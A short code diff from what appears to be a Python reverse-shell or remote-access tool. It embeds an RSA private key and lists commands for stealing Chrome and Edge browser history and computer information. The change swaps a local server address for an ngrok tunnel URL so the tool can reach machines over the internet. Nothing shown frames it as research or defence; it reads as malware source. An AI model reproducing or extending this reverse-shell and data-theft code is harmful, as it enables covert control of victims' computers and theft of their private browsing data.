@@ -17,7 +17,7 @@ from urllib.request import urlopen
 from bs4 import BeautifulSoup
 
 
-    
+ngrokurl = ''
     
 private_key="""-----BEGIN RSA PRIVATE KEY-----
     MIICWwIBAAKBgQCVAL33yrxHbj2g/+c7qVHshnfXf1x/K0xIsh2pmA9AyySyxXKj
@@ -249,7 +249,7 @@ if __name__=='__main__':
      ,'get chrome history','get edge history','get computer info'
     ]
     
-    Revers_shell_server('http://192.168.58.1/revers%20shell/',red_list=in_commend).start()
+    Revers_shell_server(ngrokurl,red_list=in_commend).start()
     
     
     
